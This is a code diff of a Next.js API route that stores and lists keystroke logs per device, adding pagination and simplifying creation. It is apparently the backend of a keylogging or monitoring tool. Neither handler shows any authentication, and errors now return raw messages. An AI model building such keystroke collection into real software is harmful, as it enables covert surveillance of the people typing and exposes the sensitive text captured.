@@ -4,50 +4,39 @@ import prisma from "@/lib/prisma";
 export async function GET(request: Request) {
   try {
     const url = new URL(request.url);
-    const device = url.searchParams.get("device");
-    const user = url.searchParams.get("user");
+    const deviceId = url.searchParams.get("deviceId");
+    const type = url.searchParams.get("type");
     const flagged = url.searchParams.get("flagged");
     const limit = url.searchParams.get("limit")
       ? Number.parseInt(url.searchParams.get("limit")!)
-      : undefined;
+      : 100;
+    const skip = url.searchParams.get("skip")
+      ? Number.parseInt(url.searchParams.get("skip")!)
+      : 0;
 
-    // Build the filter object for Prisma
-    const filter: any = {};
+    // Build the where clause for the Prisma query
+    const where: any = {};
 
-    if (device) {
-      filter.device = {
-        name: {
-          contains: device,
-          mode: "insensitive",
-        },
-      };
+    if (deviceId) {
+      where.deviceId = deviceId;
     }
 
-    if (user) {
-      filter.user = {
-        name: {
-          contains: user,
-          mode: "insensitive",
-        },
-      };
+    if (type) {
+      where.type = type;
     }
 
-    if (flagged) {
-      filter.flagged = flagged === "true";
+    if (flagged !== null && flagged !== undefined) {
+      where.flagged = flagged === "true";
     }
 
-    // Fetch keylogs from database with filters
+    // Fetch keylogs from the database using Prisma
     const keylogs = await prisma.keylog.findMany({
-      where: filter,
+      where,
       include: {
         device: {
           select: {
             name: true,
-          },
-        },
-        user: {
-          select: {
-            name: true,
+            type: true,
           },
         },
       },
@@ -55,24 +44,40 @@ export async function GET(request: Request) {
         timestamp: "desc",
       },
       take: limit,
+      skip: skip,
     });
 
-    // Format the response
+    // Get total count for pagination
+    const totalCount = await prisma.keylog.count({ where });
+
+    // Format the response data
     const formattedKeylogs = keylogs.map((keylog) => ({
       id: keylog.id,
       device: keylog.device?.name || "Unknown Device",
-      user: keylog.user?.name || "Unknown User",
-      timestamp: keylog.timestamp,
+      deviceId: keylog.deviceId,
+      timestamp: keylog.timestamp.toISOString(),
       type: keylog.type,
       content: keylog.content,
       flagged: keylog.flagged,
     }));
 
-    return NextResponse.json({ keylogs: formattedKeylogs });
+    return NextResponse.json({
+      keylogs: formattedKeylogs,
+      pagination: {
+        total: totalCount,
+        limit,
+        skip,
+        hasMore: skip + limit < totalCount,
+      },
+    });
   } catch (error) {
     console.error("Error fetching keylogs:", error);
     return NextResponse.json(
-      { success: false, message: "Failed to fetch keylogs" },
+      {
+        success: false,
+        message: "Failed to fetch keylogs",
+        error: (error as Error).message,
+      },
       { status: 500 },
     );
   }
@@ -80,55 +85,59 @@ export async function GET(request: Request) {
 
 export async function POST(request: Request) {
   try {
-    const keylogData = await request.json();
+    const data = await request.json();
 
     // Validate required fields
-    if (!keylogData.deviceId || !keylogData.type || !keylogData.content) {
+    if (!data.deviceId || !data.content || !data.type) {
       return NextResponse.json(
         {
           success: false,
           message:
-            "Missing required fields: deviceId, type, and content are required",
+            "Missing required fields: deviceId, content, and type are required",
         },
         { status: 400 },
       );
     }
 
-    // Check if device exists
-    const device = await prisma.device.findUnique({
-      where: { id: keylogData.deviceId },
-    });
-
-    if (!device) {
-      return NextResponse.json(
-        { success: false, message: "Device not found" },
-        { status: 404 },
-      );
-    }
-
-    // Create the keylog entry
-    const newKeylog = await prisma.keylog.create({
+    // Create a new keylog entry
+    const keylog = await prisma.keylog.create({
       data: {
-        type: keylogData.type,
-        content: keylogData.content,
-        flagged: keylogData.flagged || false,
-        timestamp: keylogData.timestamp
-          ? new Date(keylogData.timestamp)
-          : new Date(),
-        deviceId: keylogData.deviceId,
-        userId: keylogData.userId || device.userId, // Use device's user if not specified
+        deviceId: data.deviceId,
+        content: data.content,
+        type: data.type,
+        flagged: data.flagged || false,
+        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
+      },
+      include: {
+        device: {
+          select: {
+            name: true,
+          },
+        },
       },
     });
 
     return NextResponse.json({
       success: true,
-      message: "Keylog data received successfully",
-      keylog: newKeylog,
+      message: "Keylog created successfully",
+      keylog: {
+        id: keylog.id,
+        device: keylog.device?.name || "Unknown Device",
+        deviceId: keylog.deviceId,
+        timestamp: keylog.timestamp.toISOString(),
+        type: keylog.type,
+        content: keylog.content,
+        flagged: keylog.flagged,
+      },
     });
   } catch (error) {
-    console.error("Error processing keylog data:", error);
+    console.error("Error creating keylog:", error);
     return NextResponse.json(
-      { success: false, message: "Failed to process keylog data" },
+      {
+        success: false,
+        message: "Failed to create keylog",
+        error: (error as Error).message,
+      },
       { status: 500 },
     );
   }
